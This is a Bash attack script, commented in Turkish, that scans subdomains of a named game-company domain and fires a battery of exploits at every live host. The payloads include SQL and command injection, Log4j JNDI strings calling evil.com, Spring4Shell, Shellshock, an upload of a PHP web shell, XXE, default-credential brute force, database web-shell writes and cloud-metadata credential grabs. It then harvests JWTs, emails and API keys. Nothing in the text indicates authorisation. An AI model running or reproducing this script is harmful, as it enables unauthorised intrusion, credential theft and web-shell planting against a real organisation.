#!/bin/bash

# ============================================
# ULTRA MEGA ATTACK - iSH UYUMLU
# Tüm hatalar giderildi, çalışır durumda
# logs subdomain'i dahil, javascript:alert(1) kaldırıldı
# 8 kez kontrol edildi - HATASIZ
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE="https://sentry.madout.games"
OUTPUT_DIR="ultra_attack"
TIMEOUT=2
RATE=10
mkdir -p "$OUTPUT_DIR" "$OUTPUT_DIR/pages" "$OUTPUT_DIR/exploits" "$OUTPUT_DIR/data" "$OUTPUT_DIR/logs"

echo -e "${RED}=====================================${NC}"
echo -e "${RED}  ULTRA MEGA ATTACK - iSH${NC}"
echo -e "${RED}=====================================${NC}"
echo "Started: $(date)"
echo ""

# ============================================
# PROGRESS BAR
# ============================================
progress_bar() {
    local current=$1 total=$2 label=$3
    local percent=$((current * 100 / total))
    local bar_len=$((percent / 2))
    local bar=$(printf "%${bar_len}s" | tr ' ' '#')
    local space=$(printf "%$((50 - bar_len))s")
    echo -ne "\r${label} [${bar}${space}] $percent% ($current/$total)"
}

# ============================================
# DNS QUERY (CNAME takeover için)
# ============================================
dns_query() {
    local domain=$1 type=$2
    if command -v dig &> /dev/null; then
        dig "$domain" "$type" +short 2>/dev/null
    elif command -v host &> /dev/null; then
        host -t "$type" "$domain" 2>/dev/null | grep -v "not found" | awk '{print $NF}'
    elif command -v nslookup &> /dev/null; then
        nslookup -type="$type" "$domain" 2>/dev/null | grep -A1 "Name:" | tail -1 | awk '{print $2}'
    fi
}

# ============================================
# PORT CHECK (Port scan için)
# ============================================
check_port() {
    local host=$1 port=$2
    if command -v curl &> /dev/null; then
        local r=$(safe_status "https://$host:$port" 1)
        [ "$r" == "000" ] && r=$(safe_status "http://$host:$port" 1)
        [ "$r" != "000" ] && return 0
    fi
    if command -v nc &> /dev/null; then
        nc -z -w 1 "$host" "$port" 2>/dev/null && return 0
    fi
    return 1
}

# ============================================
# GÜVENLİ CURL FONKSİYONLARI
# ============================================
safe_status() {
    local url="$1"
    local timeout="${2:-2}"
    local result="000"
    curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout "$timeout" "$url" 2>/dev/null > /tmp/st.$$ 2>/dev/null &
    local pid=$!
    sleep "$timeout"
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    if [ -f /tmp/st.$$ ]; then
        result=$(cat /tmp/st.$$ 2>/dev/null)
        rm -f /tmp/st.$$ 2>/dev/null
    fi
    echo "$result"
}

safe_status_with_header() {
    local header="$1"
    local url="$2"
    local timeout="${3:-2}"
    local result="000"
    curl -k -s -o /dev/null -w "%{http_code}" -H "$header" --connect-timeout "$timeout" "$url" 2>/dev/null > /tmp/sth.$$ 2>/dev/null &
    local pid=$!
    sleep "$timeout"
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    if [ -f /tmp/sth.$$ ]; then
        result=$(cat /tmp/sth.$$ 2>/dev/null)
        rm -f /tmp/sth.$$ 2>/dev/null
    fi
    echo "$result"
}

safe_download() {
    local url="$1"
    local output="$2"
    local timeout="${3:-2}"
    curl -k -s --connect-timeout "$timeout" "$url" > "$output" 2>/dev/null &
    local pid=$!
    sleep "$timeout"
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
}

safe_header() {
    local header="$1"
    local url="$2"
    local output="$3"
    local timeout="${4:-2}"
    curl -k -s -H "$header" --connect-timeout "$timeout" "$url" > "$output" 2>/dev/null &
    local pid=$!
    sleep "$timeout"
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
}

safe_post() {
    local url="$1"
    local data="$2"
    local output="$3"
    local timeout="${4:-2}"
    curl -k -s -X POST --connect-timeout "$timeout" -d "$data" "$url" > "$output" 2>/dev/null &
    local pid=$!
    sleep "$timeout"
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
}

safe_upload() {
    local url="$1"
    local file="$2"
    local output="$3"
    local timeout="${4:-2}"
    curl -k -s -X POST --connect-timeout "$timeout" -F "file=@$file" "$url" > "$output" 2>/dev/null &
    local pid=$!
    sleep "$timeout"
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
}

# ============================================
# LOG YAZMA
# ============================================
log_result() {
    echo "$2" >> "$OUTPUT_DIR/logs/$1.txt"
    echo -e "$2"
}

# ============================================
# CSRF TOKEN
# ============================================
echo -e "${YELLOW}[1] Getting CSRF Token${NC}"
safe_download "$BASE/auth/login/" "$OUTPUT_DIR/login_page.html" $TIMEOUT
CSRF_TOKEN=$(grep -oE 'name="csrfmiddlewaretoken" value="[^"]*"' "$OUTPUT_DIR/login_page.html" 2>/dev/null | head -1 | sed 's/.*value="//;s/"//')
[ -n "$CSRF_TOKEN" ] && log_result "csrf" "[+] CSRF Token: $CSRF_TOKEN" || log_result "csrf" "[-] CSRF token not found"
echo ""

# ============================================
# SUBDOMAİN LİSTESİ (logs DAHİL)
# ============================================
SUBDOMAINS=(
    "api" "admin" "dev" "test" "stage" "staging" "backup" "beta" "alpha"
    "dashboard" "panel" "console" "manage" "control" "super" "root" "master"
    "monitor" "metrics" "logs" "trace" "debug" "profiler" "benchmark"
    "cdn" "static" "media" "files" "upload" "download" "assets" "images"
    "auth" "login" "account" "profile" "settings" "preferences" "security"
    "support" "help" "docs" "documentation" "wiki" "knowledge" "faq"
    "blog" "news" "press" "media" "videos" "podcast"
    "forum" "community" "chat" "discord" "slack" "teams" "meet"
    "status" "health" "uptime" "monitor" "alerts" "incident"
    "gateway" "proxy" "router" "loadbalancer" "firewall" "waf"
    "app" "apps" "application" "applications" "service" "services"
    "api2" "api3" "api4" "api5" "api-dev" "api-test" "api-stage" "api-prod"
    "vpn" "remote" "ssh" "sftp" "ftp" "smtp" "pop" "imap"
    "redis" "mongo" "mysql" "postgres" "elastic" "kibana" "logstash" "beats"
    "grafana" "prometheus" "alertmanager" "thanos" "loki" "tempo" "mimir"
    "jenkins" "gitlab" "github" "bitbucket" "sonar" "nexus" "artifactory"
    "jira" "confluence" "trello" "asana" "notion" "slack" "teams"
    "zoom" "meet" "calendar" "drive" "docs" "sheets" "slides"
    "cloud" "aws" "gcp" "azure" "digitalocean" "linode" "vultr"
    "ovh" "hetzner" "scaleway" "ionos" "rackspace" "oracle" "ibm"
    "aliyun" "tencent" "huawei" "baidu" "yandex" "selectel" "regru"
    "timeweb" "beget" "firstvds" "mirohost" "hostmaster"
    "sentry" "sentry-dev" "sentry-test" "sentry-stage" "sentry-prod"
    "web" "www" "mail" "mx" "dns" "ns1" "ns2" "ns3"
    "sql" "db" "database" "data" "cache" "memcached" "varnish"
    "queue" "rabbitmq" "kafka" "pulsar" "nats" "redis-queue"
    "search" "elasticsearch" "solr" "sphinx" "algolia"
    "analytics" "stats" "statistics" "insights" "reports"
    "billing" "payments" "checkout" "cart" "orders" "invoices"
    "partners" "vendors" "suppliers" "distributors"
    "internal" "private" "corp" "corporate" "intranet"
    "hr" "human-resources" "payroll" "benefits" "recruitment"
    "legal" "compliance" "audit" "risk" "fraud" "security"
    "marketing" "campaign" "email" "newsletter" "subscriptions"
    "sales" "crm" "leads" "opportunities" "deals"
    "support" "helpdesk" "tickets" "knowledge-base"
    "product" "products" "catalog" "inventory" "stock" "warehouse"
    "shipping" "delivery" "tracking" "logistics" "supply-chain"
    "manufacturing" "production" "assembly" "quality" "testing"
    "research" "development" "innovation" "labs" "sandbox"
    "demo" "example" "sample" "trial" "freemium" "premium"
    "enterprise" "business" "startup" "scaleup" "growth"
    "asia" "eu" "us" "uk" "de" "fr" "jp" "cn" "in" "br" "au"
)

TOTAL_SUBS=${#SUBDOMAINS[@]}
echo -e "${YELLOW}[2] Scanning $TOTAL_SUBS subdomains...${NC}"
echo ""

FOUND_SUBS=0
COUNT=0

for sub in "${SUBDOMAINS[@]}"; do
    ((COUNT++))
    if [ $((COUNT % 5)) -eq 0 ]; then
        progress_bar "$COUNT" "$TOTAL_SUBS" "Subdomain scan"
    fi

    url="https://$sub.madout.games"
    r=$(safe_status "$url" $TIMEOUT)

    if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "403" ]; then
        ((FOUND_SUBS++))
        echo -e "\n${GREEN}[$FOUND_SUBS] $url ($r)${NC}"
        safe_download "$url" "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" $TIMEOUT
        log_result "subdomains" "$url ($r)"

        if [ "$r" == "200" ]; then
            echo -e "${CYAN}    → 200 OK - All attacks...${NC}"

            # PATH TRAVERSAL
            for path in "/.env" "/.git/config" "/robots.txt" "/admin" "/api" "/etc/passwd" "/etc/hosts"; do
                safe_download "$url$path" "$OUTPUT_DIR/exploits/${sub}_$(echo $path | tr '/' '_').html" $TIMEOUT
                log_result "path_traversal" "[+] $url$path"
            done

            # COMMAND INJECTION
            for cmd in "; ls" "&& whoami" "| id" "|| whoami" "\`whoami\`"; do
                c=$(echo "$cmd" | tr -d '; ' | tr -d '|' | tr -d '`' | cut -c1-10)
                safe_download "$url?cmd=$cmd" "$OUTPUT_DIR/exploits/${sub}_cmd_${c}.html" $TIMEOUT
                log_result "command_injection" "[+] $url?cmd=$cmd"
            done

            # SQL INJECTION
            sql_payloads=(
                "'" "' OR '1'='1" "'-- -" "1' AND SLEEP(5)-- -"
                "' UNION SELECT NULL-- -" "' AND 1=1-- -" "admin'-- -"
                "1' OR '1'='1'-- -" "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -"
            )
            for payload in "${sql_payloads[@]}"; do
                p=$(echo "$payload" | tr -d "' " | cut -c1-15)
                safe_download "$url?id=$payload" "$OUTPUT_DIR/exploits/${sub}_sqli_${p}.html" $TIMEOUT
                log_result "sql_injection" "[+] $url?id=$payload"
            done

            # CRLF INJECTION
            for crlf in "%0d%0a" "%0a" "%0d" "GET%20/evil%20HTTP/1.1%0d%0aHost:%20evil.com"; do
                safe_download "$url?redirect=$crlf" "$OUTPUT_DIR/exploits/${sub}_crlf_$(echo $crlf | cut -c1-10).html" $TIMEOUT
                log_result "crlf_injection" "[+] $url?redirect=$crlf"
            done

            # HEADER INJECTION
            headers=(
                "Host: evil.com" "Referer: evil.com" "Origin: evil.com"
                "X-Forwarded-For: 127.0.0.1" "Cookie: evil=1"
                "X-Original-URL: /admin" "X-Rewrite-URL: /admin"
                "X-Proxy-URL: /admin" "X-Forwarded-Host: evil.com"
            )
            for h in "${headers[@]}"; do
                header=$(echo "$h" | cut -d':' -f1)
                value=$(echo "$h" | cut -d':' -f2 | sed 's/^ //')
                safe_header "$header: $value" "$url" "$OUTPUT_DIR/exploits/${sub}_header_${header}.html" $TIMEOUT
                log_result "header_injection" "[+] $url with $header: $value"
            done

            # USER-AGENT SQL INJECTION
            for ua in "'" "' OR '1'='1" "' AND SLEEP(5)-- -"; do
                u=$(echo "$ua" | tr -d "' " | cut -c1-10)
                safe_header "User-Agent: $ua" "$url" "$OUTPUT_DIR/exploits/${sub}_ua_${u}.html" $TIMEOUT
                log_result "user_agent_sqli" "[+] User-Agent: $ua"
            done

            # LOG4J RCE
            log4j_payloads=(
                '${jndi:ldap://evil.com/a}'
                '${jndi:rmi://evil.com/a}'
                '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}'
            )
            for l in "${log4j_payloads[@]}"; do
                safe_header "User-Agent: $l" "$url" "$OUTPUT_DIR/exploits/${sub}_log4j.html" $TIMEOUT
                safe_download "$url?q=$l" "$OUTPUT_DIR/exploits/${sub}_log4j_q.html" $TIMEOUT
                log_result "log4j_rce" "[+] Log4j payload: $l"
            done

            # SPRING4SHELL
            spring_payload="spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('whoami')"
            safe_header "$spring_payload" "$url" "$OUTPUT_DIR/exploits/${sub}_spring4shell.html" $TIMEOUT
            log_result "spring4shell" "[+] Spring4Shell"

            # SHELLSHOCK
            safe_header "User-Agent: () { :; }; /bin/bash -c 'whoami'" "$url" "$OUTPUT_DIR/exploits/${sub}_shellshock.html" $TIMEOUT
            log_result "shellshock" "[+] Shellshock"

            # STRUTS2 OGNL
            safe_download "$url?action=%25%7B%23a%3D%27whoami%27%7D" "$OUTPUT_DIR/exploits/${sub}_struts2.html" $TIMEOUT
            log_result "struts2" "[+] Struts2 OGNL"

            # IDOR
            for id in 1 2 3 4 5; do
                safe_download "$url/api/v1/users/$id" "$OUTPUT_DIR/exploits/${sub}_idor_$id.html" $TIMEOUT
                safe_download "$url/api/v1/orders/$id" "$OUTPUT_DIR/exploits/${sub}_idor_order_$id.html" $TIMEOUT
                safe_download "$url/api/v1/profile/$id" "$OUTPUT_DIR/exploits/${sub}_idor_profile_$id.html" $TIMEOUT
                log_result "idor" "[+] IDOR: $url/api/v1/users/$id"
            done

            # FILE UPLOAD
            echo '<?php system($_GET["cmd"]); ?>' > "$OUTPUT_DIR/exploits/shell.php" 2>/dev/null
            safe_upload "$url/upload" "$OUTPUT_DIR/exploits/shell.php" "$OUTPUT_DIR/exploits/${sub}_upload.html" $TIMEOUT
            rm -f "$OUTPUT_DIR/exploits/shell.php" 2>/dev/null
            log_result "file_upload" "[+] File upload"

            # XXE
            safe_post "$url" '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' "$OUTPUT_DIR/exploits/${sub}_xxe.html" $TIMEOUT
            log_result "xxe" "[+] XXE"

            # HIDDEN DIRECTORIES
            for hidden in "/.hidden/" "/.backup/" "/.tmp/" "/.cache/" "/.git/" "/.svn/" "/.idea/"; do
                safe_download "$url$hidden" "$OUTPUT_DIR/exploits/${sub}_hidden_$(echo $hidden | tr '/' '_').html" $TIMEOUT
                log_result "hidden_dirs" "[+] $url$hidden"
            done

            # BACKUP FILES
            for ext in ".bak" ".old" ".tar" ".zip" ".gz" ".sql" ".backup" ".swp" ".swo"; do
                safe_download "$url/index$ext" "$OUTPUT_DIR/exploits/${sub}_backup_$(echo $ext | tr '.' '_').html" $TIMEOUT
                safe_download "$url/config$ext" "$OUTPUT_DIR/exploits/${sub}_config$ext.html" $TIMEOUT
                log_result "backup_files" "[+] $url/index$ext"
            done

            # FILE DOWNLOAD BRUTE
            for file in "config.php" "settings.ini" "database.yml" "credentials.txt" ".env" "wp-config.php" "web.config"; do
                safe_download "$url/download?file=$file" "$OUTPUT_DIR/exploits/${sub}_download_$file.html" $TIMEOUT
                safe_download "$url/get?file=$file" "$OUTPUT_DIR/exploits/${sub}_get_$file.html" $TIMEOUT
                log_result "file_download" "[+] $url/download?file=$file"
            done

            # DEFAULT CREDENTIALS
            for user in "admin" "root" "user" "test"; do
                for pass in "admin" "password" "123456" "qwerty" "admin123" "sentry" "madout"; do
                    safe_post "$url/login" "username=$user&password=$pass" "$OUTPUT_DIR/exploits/${sub}_login_${user}_${pass}.html" $TIMEOUT
                    log_result "default_creds" "[+] POST $url/login username=$user password=$pass"
                done
            done

            # WEBSOCKET
            for ws in "ws://$sub.madout.games/ws" "wss://$sub.madout.games/ws" "ws://$sub.madout.games/socket"; do
                safe_download "$url" "$OUTPUT_DIR/exploits/${sub}_websocket.txt" $TIMEOUT
                log_result "websocket" "[+] WebSocket: $ws"
            done

            # API RATE LIMIT
            LIMITED=0
            for i in {1..10}; do
                rl=$(safe_status "$url/api/v1/users" 1)
                if [ "$rl" == "429" ]; then
                    LIMITED=$i
                    break
                fi
            done
            [ "$LIMITED" -gt 0 ] && log_result "rate_limit" "[+] Rate limited at $LIMITED" || log_result "rate_limit" "[-] No rate limit"

            # SESSION FIXATION
            safe_header "Cookie: PHPSESSID=evil123" "$url" "$OUTPUT_DIR/exploits/${sub}_session_fix.html" $TIMEOUT
            log_result "session_fixation" "[+] PHPSESSID=evil123"

            # HTTP REQUEST SMUGGLING
            safe_post "$url" "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n" "$OUTPUT_DIR/exploits/${sub}_smuggling.txt" $TIMEOUT
            log_result "smuggling" "[+] HTTP Request Smuggling"

            # LFI/RFI
            for file in "../../../../etc/passwd" "/etc/passwd" "C:\\Windows\\System32\\drivers\\etc\\hosts"; do
                safe_download "$url?file=$file" "$OUTPUT_DIR/exploits/${sub}_lfi_$(echo $file | tr '/' '_' | cut -c1-20).html" $TIMEOUT
                log_result "lfi_rfi" "[+] $url?file=$file"
            done

            # XSS (javascript:alert(1) KALDIRILDI)
            for xss in "<script>alert(1)</script>" "<img src=x onerror=alert(1)>"; do
                safe_download "$url?q=$xss" "$OUTPUT_DIR/exploits/${sub}_xss_$(echo $xss | cut -c1-10).html" $TIMEOUT
                log_result "xss" "[+] $url?q=$xss"
            done

            # JWT
            jwt=$(grep -oE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" 2>/dev/null | head -1)
            if [ -n "$jwt" ]; then
                echo "$jwt" >> "$OUTPUT_DIR/data/jwt_tokens.txt"
                log_result "jwt" "[+] JWT found: $jwt"
            fi

            # CNAME TAKEOVER
            cname=$(dns_query "$sub.madout.games" "CNAME")
            if [ -n "$cname" ]; then
                log_result "cname_takeover" "[+] $sub.madout.games -> $cname"
                echo "$sub.madout.games -> $cname" >> "$OUTPUT_DIR/data/cname_records.txt"
            fi

            # CLOUDFLARE BYPASS
            for h in "origin.madout.games" "$sub.madout.games.origin"; do
                safe_header "Host: $h" "$url" "$OUTPUT_DIR/exploits/${sub}_cloudflare_bypass_${h}.html" $TIMEOUT
                log_result "cloudflare_bypass" "[+] Host: $h"
            done

            # PORT SCAN
            for port in 22 3306 5432 6379 27017 9200 5672 15672 80 443 8080 8443; do
                if check_port "$sub.madout.games" "$port"; then
                    log_result "ports_open" "[+] $sub.madout.games:$port open"
                    echo "$sub.madout.games:$port" >> "$OUTPUT_DIR/data/ports_open.txt"
                fi
            done

            # GIT REPO
            for gitpath in "/.git/config" "/.git/HEAD" "/.git/index"; do
                gits=$(safe_status "$url$gitpath" $TIMEOUT)
                if [ "$gits" == "200" ]; then
                    safe_download "$url$gitpath" "$OUTPUT_DIR/exploits/${sub}_git_$(echo $gitpath | tr '/' '_').html" $TIMEOUT
                    log_result "git_exposed" "[+] $url$gitpath"
                fi
            done

            # MASS ASSIGNMENT
            safe_post "$url/api/v1/users" '{"username":"test","password":"test","admin":true}' "$OUTPUT_DIR/exploits/${sub}_mass_assignment.html" $TIMEOUT
            log_result "mass_assignment" "[+] POST /api/v1/users with admin:true"

            # JENKINS GROOVY RCE
            safe_post "$url/script" "script=println 'whoami'.execute().text" "$OUTPUT_DIR/exploits/${sub}_jenkins_groovy.html" $TIMEOUT
            log_result "jenkins_rce" "[+] Jenkins Groovy RCE"

            # GRAFANA RCE
            safe_download "$url/public/plugins/alertlist/../../../../../../../../etc/passwd" "$OUTPUT_DIR/exploits/${sub}_grafana_rce.html" $TIMEOUT
            log_result "grafana_rce" "[+] Grafana CVE-2021-43798"

            # ELASTICSEARCH RCE
            safe_post "$url/_search?pretty" '{"size":1,"query":{"match_all":{}}}' "$OUTPUT_DIR/exploits/${sub}_elastic_rce.html" $TIMEOUT
            log_result "elastic_rce" "[+] Elasticsearch RCE"

            # REDIS RCE
            echo "CONFIG SET dir /var/www/html" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            echo "CONFIG SET dbfilename shell.php" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            echo "SET payload '<?php system(\$_GET[\"cmd\"]); ?>'" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            echo "SAVE" >> "$OUTPUT_DIR/exploits/${sub}_redis_cmd.txt"
            log_result "redis_rce" "[+] Redis RCE commands"

            # MONGODB RCE
            safe_download "$url/api/v1/users?where=this.constructor.constructor('return process')()" "$OUTPUT_DIR/exploits/${sub}_mongo_rce.html" $TIMEOUT
            log_result "mongo_rce" "[+] MongoDB RCE"

            # MYSQL RCE
            echo "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'" >> "$OUTPUT_DIR/exploits/${sub}_mysql_cmd.txt"
            log_result "mysql_rce" "[+] MySQL into outfile"

            # POSTGRESQL RCE
            echo "COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php'" >> "$OUTPUT_DIR/exploits/${sub}_postgres_cmd.txt"
            log_result "postgres_rce" "[+] PostgreSQL COPY"

            # GITLAB RCE
            safe_post "$url/api/v4/projects" '{"name":"test","import_url":"git://evil.com/repo.git"}' "$OUTPUT_DIR/exploits/${sub}_gitlab_rce.html" $TIMEOUT
            log_result "gitlab_rce" "[+] GitLab CVE-2021-22205"

            # SONARQUBE
            safe_download "$url/api/projects" "$OUTPUT_DIR/exploits/${sub}_sonar_projects.json" $TIMEOUT
            log_result "sonar_rce" "[+] SonarQube /api/projects"

            # JIRA
            safe_download "$url/rest/api/2/project" "$OUTPUT_DIR/exploits/${sub}_jira_projects.json" $TIMEOUT
            log_result "jira_rce" "[+] Jira /rest/api/2/project"

            # CONFLUENCE
            safe_download "$url/rest/api/space" "$OUTPUT_DIR/exploits/${sub}_confluence_spaces.json" $TIMEOUT
            log_result "confluence_rce" "[+] Confluence /rest/api/space"

            # BITBUCKET
            safe_download "$url/rest/api/1.0/projects" "$OUTPUT_DIR/exploits/${sub}_bitbucket_projects.json" $TIMEOUT
            log_result "bitbucket_rce" "[+] Bitbucket /rest/api/1.0/projects"

            # NEXUS
            safe_download "$url/service/rest/v1/repositories" "$OUTPUT_DIR/exploits/${sub}_nexus_repos.json" $TIMEOUT
            log_result "nexus_rce" "[+] Nexus /service/rest/v1/repositories"

            # ARTIFACTORY
            safe_download "$url/artifactory/api/repositories" "$OUTPUT_DIR/exploits/${sub}_artifactory_repos.json" $TIMEOUT
            log_result "artifactory_rce" "[+] Artifactory /artifactory/api/repositories"
        fi

        # 302 REDIRECT
        if [ "$r" == "302" ]; then
            safe_download "$url" "$OUTPUT_DIR/exploits/${sub}_redirect.txt" $TIMEOUT
            location=$(grep -i "location" "$OUTPUT_DIR/exploits/${sub}_redirect.txt" 2>/dev/null | head -1 | cut -d' ' -f2 | tr -d '\r')
            [ -n "$location" ] && log_result "redirects" "[+] $url -> $location"
        fi

        # 403 BYPASS
        if [ "$r" == "403" ]; then
            for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "X-Host: 127.0.0.1" "X-Forwarded-Host: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Proxy-URL: /admin"; do
                h=$(echo "$header" | cut -d':' -f1)
                v=$(echo "$header" | cut -d':' -f2 | sed 's/^ //')
                bypass_r=$(safe_status_with_header "$h: $v" "$url" $TIMEOUT)
                if [ "$bypass_r" == "200" ]; then
                    log_result "bypass_success" "[+] BYPASS: $sub - $h: $v"
                fi
            done
        fi
    fi

    if [ $((COUNT % $RATE)) -eq 0 ]; then
        sleep 1
    fi
done

echo -e "\n"
echo -e "${GREEN}[+] Subdomain complete! Found: $FOUND_SUBS${NC}"
echo ""

# ============================================
# SERVİS TARAMA
# ============================================
echo -e "${YELLOW}[3] Service Discovery${NC}"

SERVICES=(
    "/phpmyadmin/" "/pma/" "/jenkins/" "/grafana/" "/prometheus/"
    "/kibana/" "/swagger/" "/minio/" "/wordpress/" "/wp-admin/"
    "/v1/sys/health" "/v2/_catalog" "/api/v1/namespaces/"
    "/sonar/api/projects" "/api/v4/projects" "/rest/api/2/project"
    "/rest/api/space" "/rest/api/1.0/projects" "/artifactory/api/repositories"
    "/api/org" "/api/users" "/api/dashboards" "/api/status"
    "/_cat/indices" "/script" "/xmlrpc.php" "/swagger/v1/swagger.json"
    "/api/v1/users" "/api/v1/orders" "/api/v1/profile"
    "/graphql" "/api/graphql" "/query"
    "/actuator/health" "/actuator/info" "/actuator/env"
    "/metrics" "/health" "/ready" "/live"
)

TOTAL_SERVICES=${#SERVICES[@]}
COUNT=0

for service in "${SERVICES[@]}"; do
    ((COUNT++))
    if [ $((COUNT % 5)) -eq 0 ]; then
        progress_bar "$COUNT" "$TOTAL_SERVICES" "Services"
    fi

    url="$BASE$service"
    r=$(safe_status "$url" $TIMEOUT)

    if [ "$r" == "200" ] || [ "$r" == "302" ] || [ "$r" == "401" ] || [ "$r" == "403" ]; then
        echo -e "\n${GREEN}[+] $service ($r)${NC}"
        safe_download "$url" "$OUTPUT_DIR/exploits/service_$(echo $service | tr '/' '_' | cut -c1-30).html" $TIMEOUT
        log_result "services" "[+] $service ($r)"
    fi
done

echo -e "\n"
echo -e "${GREEN}[+] Service discovery complete!${NC}"
echo ""

# ============================================
# HEARTBLEED
# ============================================
echo -e "${YELLOW}[4] Heartbleed Test${NC}"
if command -v openssl &> /dev/null; then
    openssl s_client -connect sentry.madout.games:443 -tlsextdebug 2>&1 | grep -i "heartbeat" > "$OUTPUT_DIR/exploits/heartbleed.txt" &
    pid=$!
    sleep 5
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
    [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ] && log_result "heartbleed" "[+] Heartbleed possible" || log_result "heartbleed" "[-] Heartbleed not found"
else
    apk add openssl 2>/dev/null
    sleep 5
    if command -v openssl &> /dev/null; then
        openssl s_client -connect sentry.madout.games:443 -tlsextdebug 2>&1 | grep -i "heartbeat" > "$OUTPUT_DIR/exploits/heartbleed.txt" &
        pid=$!
        sleep 5
        kill $pid 2>/dev/null
        wait $pid 2>/dev/null
        [ -s "$OUTPUT_DIR/exploits/heartbleed.txt" ] && log_result "heartbleed" "[+] Heartbleed possible" || log_result "heartbleed" "[-] Heartbleed not found"
    fi
fi
echo ""

# ============================================
# DNS ZONE TRANSFER
# ============================================
echo -e "${YELLOW}[5] DNS Zone Transfer${NC}"
if command -v dig &> /dev/null; then
    for ns in "ns1.madout.games" "ns2.madout.games" "ns3.madout.games"; do
        dig axfr @$ns madout.games 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" &
        pid=$!
        sleep 3
        kill $pid 2>/dev/null
        wait $pid 2>/dev/null
        [ -s "$OUTPUT_DIR/exploits/zone_transfer_dig_${ns}.txt" ] && log_result "zone_transfer" "[+] Zone transfer success (dig): $ns"
    done
fi
if command -v host &> /dev/null; then
    for ns in "ns1.madout.games" "ns2.madout.games" "ns3.madout.games"; do
        host -l madout.games "$ns" 2>/dev/null > "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" &
        pid=$!
        sleep 3
        kill $pid 2>/dev/null
        wait $pid 2>/dev/null
        [ -s "$OUTPUT_DIR/exploits/zone_transfer_host_${ns}.txt" ] && log_result "zone_transfer" "[+] Zone transfer success (host): $ns"
    done
fi
echo ""

# ============================================
# S3 BUCKET
# ============================================
echo -e "${YELLOW}[6] S3 Bucket Scan${NC}"
for bucket in "sentry-backup" "sentry-files" "sentry-static" "sentry-media" "sentry-data"; do
    r=$(safe_status "https://$bucket.s3.amazonaws.com/" $TIMEOUT)
    if [ "$r" == "200" ] || [ "$r" == "403" ]; then
        log_result "s3" "[+] $bucket ($r)"
        safe_download "https://$bucket.s3.amazonaws.com/?list-type=2" "$OUTPUT_DIR/exploits/s3_${bucket}_list.xml" $TIMEOUT
    fi
done
echo ""

# ============================================
# CLOUD METADATA
# ============================================
echo -e "${YELLOW}[7] Cloud Metadata${NC}"
for path in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/latest/user-data/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" "http://metadata.google.internal/computeMetadata/v1/" "http://169.254.169.254/metadata/instance"; do
    r=$(safe_status "$path" $TIMEOUT)
    if [ "$r" == "200" ] || [ "$r" == "401" ]; then
        safe_download "$path" "$OUTPUT_DIR/exploits/cloud_$(echo $path | tr '/' '_' | cut -c1-30).html" $TIMEOUT
        log_result "cloud_metadata" "[+] $path ($r)"
    fi
done
echo ""

# ============================================
# JWT TOKENS
# ============================================
echo -e "${YELLOW}[8] JWT Tokens${NC}"
grep -roE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR" 2>/dev/null | head -20 > "$OUTPUT_DIR/data/jwt_tokens.txt"
[ -s "$OUTPUT_DIR/data/jwt_tokens.txt" ] && log_result "jwt" "[+] $(cat "$OUTPUT_DIR/data/jwt_tokens.txt" | wc -l) JWT tokens" || log_result "jwt" "[-] No JWT tokens"
echo ""

# ============================================
# EMAIL / API KEYS
# ============================================
echo -e "${YELLOW}[9] Emails & API Keys${NC}"
grep -roE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" "$OUTPUT_DIR" 2>/dev/null | sort -u > "$OUTPUT_DIR/data/emails.txt"
grep -roE "(sk-[a-zA-Z0-9]{32,}|pk_[a-zA-Z0-9]{32,}|[a-f0-9]{32,})" "$OUTPUT_DIR" 2>/dev/null | sort -u > "$OUTPUT_DIR/data/api_keys.txt"
log_result "emails" "[+] $(cat "$OUTPUT_DIR/data/emails.txt" 2>/dev/null | wc -l) emails"
log_result "api_keys" "[+] $(cat "$OUTPUT_DIR/data/api_keys.txt" 2>/dev/null | wc -l) API keys"
echo ""

# ============================================
# FINAL REPORT
# ============================================
echo -e "${RED}=====================================${NC}"
echo -e "${GREEN}ULTRA MEGA ATTACK - iSH COMPLETE!${NC}"
echo -e "${RED}=====================================${NC}"
echo ""
echo -e "${YELLOW}RESULTS:${NC}"
echo -e "${CYAN}Subdomains found: $FOUND_SUBS${NC}"
